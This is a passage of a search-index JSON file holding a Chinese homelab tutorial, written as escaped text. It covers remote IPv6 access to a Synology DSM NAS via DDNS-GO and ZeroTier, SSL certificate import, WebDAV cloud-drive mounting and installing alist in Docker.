<p>\u200b\u9996\u5148\u200b\u5728\u200b\u7fa4\u6656\u200b\u7684\u200b\u7f51\u7edc\u200b\u91cc\u9762\u200b\u67e5\u770b\u200b\u6211\u4eec\u200b\u7684\u200b\u516c\u7f51\u200b IPv6 \u200b\u5730\u5740\u200b\uff1a</p> <p> </p> <p>\u200b\u7136\u540e\u200b\u786e\u4fdd\u200b\u6211\u4eec\u200b\u7684\u200b\u8def\u7531\u200b\u6216\u8005\u200b\u5149\u732b\u200b\u91cc\u9762\u200b\u5bf9\u200b IPv6 \u200b\u9632\u706b\u5899\u200b\u653e\u884c\u200b\uff1a</p> <p> </p> \u200b\u5c0f\u7c73\u200b\u8def\u7531\u5668\u200b\u7684\u200b IPv6 \u200b\u9632\u706b\u5899\u200b\u7684\u200b\u7384\u5b66\u200b\u95ee\u9898\u200b <p>\u200b\u4ee5\u200b Redmi AX3000 \u200b\u4e3a\u4f8b\u200b\uff0c\u200b\u672c\u200b\u4ee5\u4e3a\u200b\u5173\u95ed\u200b\u4e86\u200b IPv6 \u200b\u9632\u706b\u5899\u200b\uff0c\u200b\u5b9e\u9645\u200b\u6d4b\u8bd5\u200b\u53d1\u73b0\u200b\u8fd9\u4e2a\u200b\u9632\u706b\u5899\u200b\u7684\u200b\u6309\u94ae\u200b\u7ecf\u5e38\u200b\u4f1a\u200b\u4e0d\u200b\u751f\u6548\u200b\uff0c\u200b\u660e\u660e\u200b\u597d\u50cf\u200b\u662f\u200b\u5173\u200b\u4e86\u200b\u9632\u706b\u5899\u200b\uff0c\u200b\u5b9e\u9645\u4e0a\u200b IPv6 \u200b\u9632\u706b\u5899\u200b\u4f9d\u7136\u200b\u5b58\u5728\u200b\u7684\u200b\uff0c\u200b\u5177\u4f53\u200b\u7384\u5b66\u200b\u539f\u56e0\u200b\u89e3\u91ca\u200b\u4e0d\u200b\u6e05\u695a\u200b\uff1a  </p> <p>\u200b\u7136\u540e\u200b\u6211\u4eec\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b IPv6 \u00a0\u200b\u5730\u5740\u200b\u6b63\u5e38\u200b\u8bbf\u95ee\u200b\u6211\u4eec\u200b\u7684\u200b\u9ed1\u200b\u7fa4\u6656\u200b DSM \u200b\u4e86\u200b\uff1a</p> <p> </p>"},{"location":"6/6/#ddns-ipv6","title":"DDNS \u200b\u8f6c\u200b IPv6","text":"<p>\u200b\u4f46\u662f\u200b\u8fd9\u6837\u200b\u8bbf\u95ee\u200b\u4f9d\u7136\u200b\u4e0d\u591f\u200b\u4f18\u96c5\u200b\uff0cIPv6 \u200b\u5730\u5740\u200b\u4e00\u5927\u200b\u4e32\u200b\u5f88\u957f\u200b\u5f88\u957f\u200b\uff0c\u200b\u800c\u4e14\u200b\u8fd8\u200b\u53ef\u80fd\u200b IPv6 \u200b\u5730\u5740\u200b\u53d1\u751f\u200b\u53d8\u52a8\u200b\u3002\u200b\u6240\u4ee5\u200b\u4f18\u96c5\u200b\u4e00\u70b9\u200b\u7684\u200b\u65b9\u6cd5\u200b\u5c31\u662f\u200b\u4f7f\u7528\u200b  DDNS \u200b\u5c06\u200b\u6211\u4eec\u200b\u7684\u200b IPv6 \u200b\u5730\u5740\u200b\u52a8\u6001\u200b\u89e3\u6790\u200b\u5230\u200b\u6211\u4eec\u200b\u7684\u200b\u5916\u7f51\u200b\u57df\u540d\u200b\u4e0a\u9762\u200b\u53bb\u200b\uff0c\u200b\u672c\u6b21\u200b\u6559\u7a0b\u200b\u5c31\u662f\u200b\u4f7f\u7528\u200b\u7684\u200b\u662f\u200b DDNS-GO \u200b\u914d\u5408\u200b\u963f\u91cc\u200b\u4e91\u200b\u7684\u200b\u57df\u540d\u200b\u6765\u200b\u5b9e\u73b0\u200b\u7684\u200b\u3002</p> <p>\u200b\u9996\u5148\u200b DSM \u200b\u7fa4\u6656\u200b\u91cc\u9762\u200b\u5b89\u88c5\u200b\u300cDDNS-GO\u300d\u200b\u5957\u4ef6\u200b\uff1a</p> <p> </p> <p>\u200b\u63a5\u7740\u200b\u6253\u5f00\u200b DDNS-GO\uff0c\u200b\u5148\u200b\u586b\u5199\u200b\u963f\u91cc\u200b\u4e91\u200b\u7684\u200b AK \u200b\u548c\u200b SK\uff0c\u200b\u7136\u540e\u200b\u987a\u4fbf\u200b\u53d6\u6d88\u200b IPv4 \u200b\u7684\u200b\u542f\u7528\u200b\u72b6\u6001\u200b\uff1a</p> <p> </p> <p>\u200b\u7136\u540e\u200b\u9009\u62e9\u200b\u8981\u200b\u505a\u200b DDNS \u200b\u89e3\u6790\u200b\u7684\u200b IPv6 \u200b\u5730\u5740\u200b\uff0c\u200b\u4f7f\u7528\u200b<code>@2</code> \u200b\u624b\u52a8\u200b\u6307\u5b9a\u200b\u6bd4\u8f83\u200b\u957f\u200b\u7684\u200b\u8fd9\u4e2a\u200b IPv6 \u200b\u5730\u5740\u200b\uff0c\u200b\u63a5\u7740\u200b\u586b\u5199\u200b\u6211\u4eec\u200b\u60f3\u200b\u89e3\u6790\u200b\u7684\u200b\u57df\u540d\u200b\uff08\u200b\u5f85\u200b\u4f1a\u200b DDNS-GO \u200b\u4f1a\u200b\u5e2e\u200b\u6211\u200b\u81ea\u5df1\u200b\u521b\u5efa\u200b\u8fd9\u4e2a\u200b\u5b50\u200b\u57df\u540d\u200b\uff09\uff1a</p> <p> </p> <p>\u200b\u540c\u65f6\u200b\u5efa\u8bae\u200b\u5927\u5bb6\u200b\u914d\u7f6e\u200b\u4e00\u4e0b\u200b\u7981\u6b62\u200b\u516c\u7f51\u200b\u8bbf\u95ee\u200b\uff0c\u200b\u7136\u540e\u200b\u8bbe\u7f6e\u200b\u4e00\u4e0b\u200b\u7528\u6237\u540d\u200b\u548c\u200b\u5bc6\u7801\u200b\uff0c\u200b\u63d0\u9ad8\u200b\u5b89\u5168\u6027\u200b\uff1a</p> <p> </p> <p>\u200b\u53ef\u4ee5\u200b\u5728\u200b\u53f3\u4fa7\u200b\u7684\u200b\u65e5\u5fd7\u200b\u91cc\u9762\u200b\u770b\u5230\u200b\u65b0\u589e\u200b\u7684\u200b IPv6 \u200b\u89e3\u6790\u200b\u6210\u529f\u200b\uff1a</p> <p> </p> <p>\u200b\u8fdb\u200b\u963f\u91cc\u200b\u4e91\u200b\u57df\u540d\u200b\u63a7\u5236\u53f0\u200b\u770b\u770b\u200b\uff0c\u200b\u679c\u7136\u200b\u53d1\u73b0\u200b DDNS-GO \u200b\u81ea\u52a8\u200b\u5e2e\u200b\u6211\u4eec\u200b\u914d\u7f6e\u200b\u4e86\u200b IPv6 \u200b\u7684\u200b\u89e3\u6790\u200b\uff1a</p> <p> </p> <p>\u200b\u63a5\u7740\u200b\u6211\u4eec\u200b\u7684\u200b\u6d4f\u89c8\u5668\u200b\u76f4\u63a5\u200b\u8bbf\u95ee\u200b\u6211\u4eec\u200b\u7684\u200b  nasv6.sqlsec.com \u200b\u5b50\u200b\u57df\u540d\u200b\u5373\u53ef\u200b\u6b63\u5e38\u200b\u8bbf\u95ee\u200b\u6211\u4eec\u200b\u7684\u200b DSM \u200b\u7684\u200b IPv6 \u200b\u5730\u5740\u200b\u4e86\u200b\uff1a</p> <p> </p> <p>\u200b\u800c\u4e14\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u5728\u200b macOS \u200b\u4e0b\u200b\u4f7f\u7528\u200b\u8bbf\u8fbe\u76f4\u200b\u8fde\u200b\u901a\u8fc7\u200b\u6211\u4eec\u200b\u7684\u200b\u57df\u540d\u200b\u6765\u200b\u8fde\u63a5\u200b NAS\uff1a</p> <p> </p> <p>\u200b\u8fde\u63a5\u200b\u7684\u200b\u6548\u679c\u200b\uff1a</p> <p> </p> <p>\u200b\u540c\u7406\u200b\u4e5f\u200b\u53ef\u4ee5\u200b SSH \u200b\u76f4\u63a5\u200b\u8bbf\u95ee\u200b\uff1a</p> <p> </p>"},{"location":"6/6/#zerotier","title":"ZeroTier \u200b\u7ec4\u7f51","text":"<p>\u200b\u9996\u5148\u200b DSM \u200b\u7fa4\u6656\u200b\u91cc\u9762\u200b\u5b89\u88c5\u200b\u300cZeroTier\u300d\u200b\u5957\u4ef6\u200b\uff1a</p> <p> </p> <p>\u200b\u7136\u540e\u200b SSH \u200b\u5230\u200b\u547d\u4ee4\u884c\u200b\u4e0b\u200b\u64cd\u4f5c\u200b\u5373\u200b\uff1a</p> Bash<pre><code># \u200b\u5207\u6362\u200b root\nsudo -i\n\n# \u200b\u6743\u9650\u200b\u8c03\u6574\u200b\nsed -i 's/package/root/g' /var/packages/zerotier/conf/privilege\n</code></pre> <p>\u200b\u7136\u540e\u200b\u91cd\u65b0\u542f\u52a8\u200b ZeroTier \u200b\u670d\u52a1\u200b\uff1a</p> <p> </p> <p>\u200b\u6700\u540e\u200b\u76f4\u63a5\u200b\u52a0\u5165\u200b\u7f51\u7edc\u200b\u5373\u53ef\u200b\uff1a</p> Bash<pre><code># \u200b\u52a0\u5165\u200b\u7f51\u7edc\u200b\n/var/packages/zerotier/target/bin/zerotier-one -q join d5e5xxxxxx68b0\n</code></pre> <p>\u200b\u8fd4\u56de\u200b <code>200 join OK</code> \u200b\u5219\u200b\u8868\u793a\u200b\u52a0\u5165\u200b\u6210\u529f\u200b\uff1a</p> <p> </p> <p>\u200b\u7136\u540e\u200b\u5230\u200b PVE \u200b\u7684\u200b\u63a7\u5236\u53f0\u200b\u4e2d\u52fe\u9009\u200b\u8ba4\u8bc1\u200b\uff0c\u200b\u5907\u6ce8\u200b\u4e00\u4e0b\u200b\uff1a </p> <p> </p> <p>\u200b\u76f4\u63a5\u200b\u8bbf\u95ee\u200b ZertTier \u200b\u5206\u914d\u200b\u7ed9\u200b\u6211\u4eec\u200b\u7684\u200b\u5185\u7f51\u200b IP \u200b\u8bd5\u8bd5\u770b\u200b\uff1a</p> <p> </p>"},{"location":"6/7/","title":"\u6dfb\u52a0\u200b\u8bc1\u4e66","text":""},{"location":"6/7/#_1","title":"\u629b\u51fa\u200b\u95ee\u9898","text":"<p>\u200b\u524d\u9762\u200b\u4f7f\u7528\u200b DDNS \u200b\u6765\u200b\u8bbf\u95ee\u200b DSM \u200b\u7684\u200b IPv6 \u200b\u516c\u7f51\u200b\u7684\u200b\u65f6\u5019\u200b\u53d1\u73b0\u200b\u4f1a\u200b\u63d0\u793a\u200b\u4e0d\u200b\u5b89\u5168\u200b\uff0c\u200b\u8fd9\u200b\u662f\u56e0\u4e3a\u200b\u6211\u4eec\u200b\u7684\u200b SSL \u200b\u8bc1\u4e66\u200b\u548c\u200b\u57df\u540d\u200b\u5bf9\u4e0d\u4e0a\u200b\uff1a</p> <p> </p> <p>\u200b\u6240\u4ee5\u200b\u9700\u8981\u200b\u6211\u4eec\u200b\u624b\u52a8\u200b\u6dfb\u52a0\u200b\u4e00\u4e0b\u200b\u8bc1\u4e66\u200b\u5373\u53ef\u200b\u3002</p>"},{"location":"6/7/#_2","title":"\u7533\u8bf7\u200b\u8bc1\u4e66","text":"<p>\u200b\u9996\u5148\u200b\u5230\u200b\u963f\u91cc\u200b\u4e91\u200b\u7684\u200b\u63a7\u5236\u53f0\u200b\u91cc\u9762\u200b\u7533\u8bf7\u200b 1 \u200b\u4e2a\u200b\u514d\u8d39\u200b\u7684\u200b SSL \u200b\u8bc1\u4e66\u200b\uff1a</p> <p> </p> <p>\u200b\u7136\u540e\u200b\u4e00\u822c\u200b 2 \u200b\u5206\u949f\u200b\u5de6\u53f3\u200b\u5373\u53ef\u200b\u7533\u8bf7\u200b\u6210\u529f\u200b\u6279\u51c6\u200b\u4e0b\u6765\u200b\uff1a </p> <p> </p>"},{"location":"6/7/#_3","title":"\u4e0b\u8f7d\u200b\u8bc1\u4e66","text":"<p>\u200b\u4e00\u822c\u6765\u8bf4\u200b\u6211\u4eec\u200b\u4e0b\u8f7d\u200b Nginx \u200b\u7c7b\u578b\u200b\u7684\u200b\u8bc1\u4e66\u200b\u5373\u53ef\u200b\uff1a</p> <p> </p>"},{"location":"6/7/#_4","title":"\u5bfc\u5165\u200b\u8bc1\u4e66","text":"<p>\u200b\u63a7\u5236\u9762\u677f\u200b\u4e2d\u200b\u7684\u200b\u300c\u200b\u5b89\u5168\u6027\u200b\u300d\u200b\u627e\u5230\u200b\u300c\u200b\u8bc1\u4e66\u200b\u300d\u200b\u6807\u7b7e\u200b\uff0c\u200b\u624b\u52a8\u200b\u6dfb\u52a0\u200b\u6211\u4eec\u200b\u521a\u521a\u200b\u4e0b\u8f7d\u200b\u597d\u200b\u7684\u200b\u8bc1\u4e66\u200b\uff1a</p> <p> </p> <p>\u200b\u5bfc\u5165\u200b key \u200b\u548c\u200b pem \u200b\u5373\u53ef\u200b\uff1a</p> <p> </p> <p>\u200b\u5bfc\u5165\u200b\u540e\u200b\u8bb0\u5f97\u200b\u5c06\u200b\u670d\u52a1\u200b\u90fd\u200b\u5207\u6362\u200b\u4e3a\u200b\u6211\u4eec\u200b\u65b0\u200b\u7684\u200b\u8bc1\u4e66\u200b\uff1a</p> <p> </p> <p>\u200b\u6700\u540e\u200b\u6d4f\u89c8\u5668\u200b\u4f1a\u200b\u63d0\u793a\u200b\u6211\u4eec\u200b\u7684\u200b\u8fde\u63a5\u200b\u662f\u200b\u5b89\u5168\u200b\u7684\u200b\u4e86\u200b\uff0c\u200b\u5f3a\u8feb\u75c7\u200b\u72c2\u559c\u200b\uff1a</p> <p> </p>"},{"location":"6/8/","title":"WebDAV","text":""},{"location":"6/8/#webdav","title":"WebDAV \u200b\u662f\u200b\u4ec0\u4e48","text":"<p>WebDAV \uff08Web Distributed Authoring and Versioning\uff09\u200b\u662f\u200b\u4e00\u79cd\u200b\u7f51\u7edc\u200b\u6587\u4ef6\u4f20\u8f93\u200b\u534f\u8bae\u200b\uff0c\u200b\u5b83\u200b\u662f\u200b\u5728\u200b HTTP/1.1 \u200b\u534f\u8bae\u200b\u4e0a\u200b\u7684\u200b\u6269\u5c55\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u8ba9\u200b\u7528\u6237\u200b\u901a\u8fc7\u200b WebDAV \u200b\u5ba2\u6237\u7aef\u200b\u50cf\u200b\u8bbf\u95ee\u200b\u672c\u5730\u200b\u6587\u4ef6\u200b\u4e00\u6837\u200b\u8bbf\u95ee\u200b\u4e92\u8054\u7f51\u200b\u4e0a\u200b\u7684\u200b\u6587\u4ef6\u200b\uff0c\u200b\u5e76\u4e14\u200b\u652f\u6301\u200b\u5bf9\u200b\u8fd9\u4e9b\u200b\u6587\u4ef6\u200b\u7684\u200b\u4fee\u6539\u200b\u548c\u200b\u7ba1\u7406\u200b\u3002</p> <p>\u200b\u7528\u200b WebDAV\uff0c\u200b\u4f60\u200b\u53ef\u4ee5\u200b\u901a\u8fc7\u200b\u4e00\u4e2a\u200b WebDAV \u200b\u5ba2\u6237\u7aef\u200b\u8fde\u63a5\u200b\u5230\u200b\u8fdc\u7a0b\u200b\u670d\u52a1\u5668\u200b\u4e0a\u200b\u7684\u200b\u6587\u4ef6\u5939\u200b\uff0c\u200b\u50cf\u200b\u5728\u200b\u672c\u5730\u200b\u8ba1\u7b97\u673a\u200b\u4e0a\u200b\u4e00\u6837\u200b\u6d4f\u89c8\u200b\u3001\u200b\u6253\u5f00\u200b\u3001\u200b\u7f16\u8f91\u200b\u3001\u200b\u4fdd\u5b58\u200b\u3001\u200b\u5220\u9664\u200b\u7b49\u200b\u64cd\u4f5c\u200b\u6587\u4ef6\u200b\uff0c\u200b\u5c31\u200b\u50cf\u200b\u8bbf\u95ee\u200b\u672c\u5730\u200b\u6587\u4ef6\u200b\u4e00\u6837\u200b\u65b9\u4fbf\u200b\u3002\u200b\u540c\u65f6\u200b\uff0cWebDAV \u200b\u8fd8\u200b\u63d0\u4f9b\u200b\u4e86\u200b\u7248\u672c\u63a7\u5236\u200b\u548c\u200b\u9501\u5b9a\u200b\u529f\u80fd\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u8ba9\u200b\u591a\u4e2a\u200b\u7528\u6237\u200b\u534f\u4f5c\u200b\u7f16\u8f91\u200b\u540c\u4e00\u200b\u4efd\u6587\u4ef6\u200b\u65f6\u200b\u66f4\u52a0\u200b\u65b9\u4fbf\u200b\u548c\u200b\u5b89\u5168\u200b\u3002</p>"},{"location":"6/8/#_1","title":"\u5b89\u88c5\u200b\u963f\u91cc\u200b\u4e91\u76d8\u200b\u5957\u4ef6","text":"<p>\u200b\u963f\u91cc\u200b\u4e91\u76d8\u200b\u652f\u6301\u200b WebDAV \u200b\u534f\u8bae\u200b\uff0c\u200b\u6211\u4eec\u200b DSM \u200b\u7fa4\u6656\u200b\u6dfb\u52a0\u200b\u4f7f\u7528\u200b\u4e5f\u200b\u6bd4\u8f83\u200b\u65b9\u4fbf\u200b\u7b80\u5355\u200b\u3002\u200b\u9996\u5148\u200b\u5b89\u88c5\u200b\u300c\u200b\u963f\u91cc\u200b\u4e91\u76d8\u200bWebDAV\u300d\u200b\u5957\u4ef6\u200b\uff1a</p> <p> </p> <p>\u200b\u6839\u636e\u200b\u63d0\u793a\u200b\u586b\u5199\u200b\u914d\u7f6e\u200b\u5373\u53ef\u200b\uff1a</p> <p> </p> <p>\u200b\u5176\u4e2d\u200b\u9700\u8981\u200b\u586b\u5199\u200b refreshToken \u200b\u6211\u4eec\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b\u4e0b\u9762\u200b\u7684\u200b\u7f51\u7ad9\u200b\u914d\u5408\u200b\u624b\u673a\u200b\u626b\u7801\u200b\u6765\u200b\u83b7\u53d6\u200b\uff1a</p> <p>https://alist.nn.ci/zh/guide/drivers/aliyundrive.html</p> <p> </p>"},{"location":"6/8/#_2","title":"\u6302\u8f7d\u200b\u963f\u91cc\u200b\u4e91\u76d8","text":"<p>\u200b\u6dfb\u52a0\u200b\u6302\u8f7d\u200b\u963f\u91cc\u200b\u4e91\u76d8\u200b WebDAV \u200b\u4e5f\u200b\u6bd4\u8f83\u7b80\u5355\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b\u7fa4\u6656\u200b\u81ea\u5e26\u200b\u7684\u200b\u300cFile Station\u300d\u200b\u6765\u200b\u6302\u8f7d\u200b\uff1a</p> <p> </p> <p>\u200b\u9009\u62e9\u200b\u300cWebDAV/WevDAV HTTPS\u300d\u200b\u7c7b\u578b\u200b\uff1a</p> <p> </p> <p>\u200b\u7136\u540e\u200b\u586b\u5199\u200b\u6211\u4eec\u200b\u4e0a\u200b\u4e00\u6b65\u200b\u7684\u200b\u914d\u7f6e\u200b\u4fe1\u606f\u200b\u5373\u53ef\u200b\u6210\u529f\u200b\u6302\u8f7d\u200b\u6211\u4eec\u200b\u7684\u200b\u963f\u91cc\u200b\u4e91\u76d8\u200b\uff1a</p> <p> </p> <p>\u200b\u6302\u8f7d\u200b\u7684\u200b\u6548\u679c\u200b\u5982\u4e0b\u200b\uff1a</p> <p> </p>"},{"location":"6/8/#115","title":"\u6302\u8f7d\u200b 115 \u200b\u7f51\u76d8","text":"<p>\u200b\u540c\u7406\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u5b89\u88c5\u200b 115\u200b\u7f51\u76d8\u200b\u7684\u200b WevDAV \u200b\u5957\u4ef6\u200b\uff1a</p> <p> </p> <p>\u200b\u7136\u540e\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u6b63\u5e38\u200b\u6302\u8f7d\u200b\u5230\u200b\u6211\u4eec\u200b\u7684\u200b DSM \u200b\u91cc\u9762\u200b\uff1a</p> <p> </p>"},{"location":"6/9/","title":"\u5b89\u88c5\u200b alist","text":"<p>alist \u200b\u53ef\u4ee5\u200b\u7406\u89e3\u200b\u4e3a\u200b\u4e00\u4e2a\u200b\u7f51\u76d8\u200b\u6574\u5408\u7cfb\u7edf\u200b\uff0c\u200b\u57fa\u672c\u4e0a\u200b\u652f\u6301\u200b\u56fd\u5185\u200b\u7684\u200b\u5404\u79cd\u5404\u6837\u200b\u7684\u200b\u7f51\u76d8\u200b\uff0c\u200b\u975e\u5e38\u200b\u7684\u200b\u5f3a\u5927\u200b\u597d\u7528\u200b\uff0c\u200b\u57fa\u672c\u4e0a\u200b\u662f\u200b NAS  \u200b\u5fc5\u5907\u200b\u795e\u5668\u200b\u3002</p>"},{"location":"6/9/#docker","title":"Docker \u200b\u52a0\u901f","text":"<p>Docker \u200b\u6ce8\u518c\u8868\u200b\u8bbe\u7f6e\u200b\uff0c\u200b\u9009\u62e9\u200b\u9ed8\u8ba4\u200b\u7684\u200b\u5b58\u50a8\u200b\u5e93\u540e\u200b\u6211\u4eec\u200b\u70b9\u51fb\u200b\u7f16\u8f91\u200b\uff1a</p> <p> </p> <p>\u200b\u7136\u540e\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u586b\u5199\u200b\u542f\u7528\u200b Docker \u200b\u56fd\u5185\u200b\u7684\u200b\u6e90\u200b\u4e86\u200b\uff1a </p> <p> </p>"},{"location":"6/9/#alist","title":"\u5b89\u88c5\u200b alist","text":"<p>\u200b\u641c\u7d22\u200b alist \u200b\u5173\u952e\u8bcd\u200b\uff0c\u200b\u627e\u5230\u200b <code>xhofe/alist</code> \u200b\u955c\u50cf\u200b\u70b9\u51fb\u200b\u300c\u200b\u4e0b\u8f7d\u200b\u300d\uff0c\u200b\u9009\u62e9\u200b\u6700\u65b0\u200b\u7248\u672c\u200b\u7684\u200b latest \u200b\u8fdb\u884c\u200b\u4e0b\u8f7d\u200b\uff1a </p> <p> </p> <p>\u200b\u4e0b\u8f7d\u200b\u597d\u540e\u200b\u70b9\u51fb\u200b\u300c\u200b\u542f\u52a8\u200b\u300d\u200b\u7136\u540e\u200b\u7f51\u7edc\u200b\u4f7f\u7528\u200b\u300cbridge\u300d\u200b\u7c7b\u578b\u200b\uff1a</p> <p> </p> <p>\u200b\u56fd\u5149\u200b\u5c0f\u200b\u8bfe\u5802\u200b\uff1aIPv6 \u200b\u8bbf\u95ee\u200b\u9700\u6c42\u200b</p> <p>\u200b\u5982\u679c\u200b\u6709\u200b IPv6 \u200b\u8bbf\u95ee\u200b\u9700\u6c42\u200b\u7684\u8bdd\u200b\uff0c\u200b\u8fd9\u91cc\u200b\u5f97\u200b\u4f7f\u7528\u200b host \u200b\u7f51\u7edc\u200b\u7c7b\u578b\u200b\uff0c\u200b\u65e0\u200b IPv6 \u200b\u9700\u6c42\u200b\u7684\u8bdd\u200b\u4f7f\u7528\u200b\u9ed8\u8ba4\u200b\u7684\u200b bridge \u200b\u8db3\u591f\u200b\u6211\u4eec\u200b\u5927\u591a\u6570\u200b\u4eba\u200b\u4f7f\u7528\u200b\u4e86\u200b\uff0c\u200b\u800c\u4e14\u200b\u4e5f\u200b\u65b9\u4fbf\u200b\u6211\u4eec\u200b\u81ea\u5b9a\u4e49\u200b\u7aef\u53e3\u200b\u3002</p> <p>\u200b\u5e38\u89c4\u200b\u8bbe\u7f6e\u200b\u8fd9\u91cc\u200b\u9ed8\u8ba4\u200b\u5373\u53ef\u200b\uff1a</p> <p> </p> <p>\u200b\u4fee\u6539\u200b\u7aef\u53e3\u6620\u5c04\u200b\uff0c\u200b\u5c06\u200b\u5bb9\u5668\u200b\u7684\u200b 5244 \u200b\u7aef\u53e3\u6620\u5c04\u200b\u5230\u200b DSM \u200b\u7684\u200b 15244 \u200b\u7aef\u53e3\u200b\uff1a</p> <p> </p> <p>\u200b\u7136\u540e\u200b\u5206\u522b\u200b\u6302\u8f7d\u200b\u914d\u7f6e\u200b\u6587\u4ef6\u5939\u200b\uff08/opt/alist/data)\u200b\u548c\u200b\u5b58\u50a8\u200b\u6587\u4ef6\u5939\u200b\uff08/opt/alist/share)\uff1a</p> <p> </p> <p>\u200b\u7136\u540e\u200b\u5728\u200b\u5bb9\u5668\u200b\u91cc\u9762\u200b\u627e\u5230\u200b\u6211\u4eec\u200b\u65b0\u5efa\u200b\u7684\u200b\u5bb9\u5668\u200b\u53cc\u51fb\u200b\u5373\u53ef\u200b\u770b\u5230\u200b\u8fd0\u884c\u200b\u60c5\u51b5\u200b\uff1a</p> <p> </p> <p>\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\u6210\u529f\u200b\u5728\u200b 15244 \u200b\u7aef\u53e3\u200b\u8fd0\u884c\u200b\u4e86\u200b\uff1a</p> <p> </p>"},{"location":"6/9/#alist_1","title":"\u914d\u7f6e\u200b alist","text":"<p>\u200b\u4ece\u200b Docker \u200b\u7684\u200b\u65e5\u5fd7\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b admin \u200b\u7528\u6237\u200b\u7684\u200b\u5bc6\u7801\u200b\uff0c\u200b\u987a\u4fbf\u200b\u53d1\u73b0\u200b alist \u200b\u662f\u200b\u8fd0\u884c\u200b\u5728\u200b IPv4 \u200b\u7aef\u53e3\u200b\u4e0a\u200b\u7684\u200b\uff1a</p> <p> </p> <p>\u200b\u4e3a\u4e86\u200b\u65b9\u4fbf\u200b\u590d\u5236\u200b\u5bc6\u7801\u200b\uff0c\u200b\u6211\u4eec\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u5bfc\u51fa\u200b HTML \u200b\u67e5\u770b\u200b\uff1a</p> <p> </p> <p>\u200b\u7b49\u200b\u4e86\u200b\u8fdb\u53bb\u200b\u540e\u200b\u4f1a\u200b\u63d0\u793a\u200b\uff1afailed get storage: please add a storage first. \u200b\u8fd9\u200b\u8868\u793a\u200b\u6ca1\u6709\u200b\u6302\u8f7d\u200b\u4e0d\u8981\u200b\u614c\u200b\uff0c\u200b\u6211\u4eec\u200b\u624b\u52a8\u200b\u70b9\u51fb\u200b\u300c\u200b\u7ba1\u7406\u200b\u300d\uff1a</p> <p> </p>"},{"location":"6/9/#_1","title":"\u66f4\u6539\u200b\u7ba1\u7406\u200b\u5bc6\u7801","text":"<p>\u200b\u65e5\u5fd7\u200b\u91cc\u9762\u200b\u7684\u200b\u5bc6\u7801\u200b\u662f\u200b\u968f\u673a\u200b\u751f\u6210\u200b\u7684\u200b\uff0c\u200b\u6211\u4eec\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u6362\u6210\u200b\u81ea\u5b9a\u4e49\u200b\u5bc6\u7801\u200b\uff1a</p> <p></p>"},{"location":"6/9/#_2","title":"\u6dfb\u52a0\u200b\u672c\u5730\u200b\u5b58\u50a8","text":"<p>\u200b\u7136\u540e\u200b\u9009\u62e9\u200b\u672c\u5730\u200b\u5b58\u50a8\u200b\uff1a</p> <p> </p> <p>\u200b\u624b\u52a8\u200b\u6dfb\u52a0\u200b\u4e4b\u524d\u200b\u7684\u200b /opt/alist/share \u200b\u8def\u5f84\u200b\uff1a</p> <p> </p> <p>\u200b\u6700\u540e\u200b\u6dfb\u52a0\u200b\u7684\u200b\u6548\u679c\u200b\u5982\u4e0b\u200b\uff1a</p> <p> </p>"},{"location":"6/9/#_3","title":"\u6dfb\u52a0\u200b\u767e\u5ea6\u7f51\u200b\u76d8","text":"<p>\u200b\u9996\u5148\u200b\u8bbf\u95ee\u200b\u4e0b\u9762\u200b\u94fe\u63a5\u200b\u83b7\u53d6\u200b\u767e\u5ea6\u200b\u7684\u200b  refresh token\uff1a</p> Bash<pre><code>https://openapi.baidu.com/oauth/2.0/authorize?response_type=code&amp;client_id=iYCeC9g08h5vuP9UqvPHKKSVrKFXGa1v&amp;redirect_uri=https://alist.nn.ci/tool/baidu/callback&amp;scope=basic,netdisk&amp;qrcode=1\n</code></pre> <p>\u200b\u767b\u5f55\u200b\u540e\u200b\u5373\u53ef\u200b\u83b7\u53d6\u200b\uff1a</p> <p> </p> <p>\u200b\u6302\u8f7d\u200b\u7ec6\u8282\u200b\u5982\u4e0b\u200b\uff1a</p> <p> </p> <p>\u200b\u586b\u5199\u200b\u5237\u65b0\u200b\u4ee4\u724c\u200b\uff1a</p> <p> </p> <p>\u200b\u5176\u4ed6\u200b\u9ed8\u8ba4\u200b\u5373\u53ef\u200b\uff0c\u200b\u6700\u540e\u200b\u6dfb\u52a0\u200b\u7684\u200b\u6548\u679c\u200b\u5982\u4e0b\u200b\uff1a</p> <p> </p>"},{"location":"6/9/#_4","title":"\u6dfb\u52a0\u200b\u5176\u4ed6\u200b\u7f51\u76d8","text":"<p>\u200b\u4ee5\u6b64\u7c7b\u63a8\u200b\uff0c\u200b\u6211\u4eec\u200b\u53ef\u4ee5\u200b\u6dfb\u52a0\u200b\u5404\u79cd\u200b\u4e71\u4e03\u516b\u7cdf\u200b\u7684\u200b\u7f51\u76d8\u200b\uff0c\u200b\u6700\u7ec8\u200b\u7684\u200b\u5168\u90e8\u200b\u6dfb\u52a0\u200b\u7684\u200b\u6548\u679c\u200b\u5982\u4e0b\u200b\uff1a</p> <p> </p> <p>\u200b\u8fd9\u6837\u200b\u518d\u4e5f\u200b\u4e0d\u7528\u200b\u5230\u5904\u200b\u6253\u5f00\u200b\u7f51\u76d8\u200b\u4e86\u200b\uff0c\u200b\u5168\u90e8\u200b\u901a\u8fc7\u200b alist \u200b\u4ea4\u4e92\u200b\u5c31\u200b\u5b8c\u200b\u4e8b\u513f\u200b\uff1a</p> <p> </p>"},{"location":"7/1/","title":"\u51c6\u5907\u200b\u5de5\u4f5c","text":""},{"location":"7/1/#_1","title":"\u51c6\u5907\u200b\u955c\u50cf","text":"<p>\u200b\u51c6\u5907\u200b\u597d\u200b OpenCore \u200b\u5f15\u5bfc\u200b\u955c\u50cf\u200b\u548c\u200b macOS \u200b\u5b89\u88c5\u200b\u955c\u50cf\u200b\u5373\u53ef\u200b\uff1a</p> <p></p> <ul> <li>\u200b\u5b98\u65b9\u200b\u955c\u50cf\u200b</li> </ul> 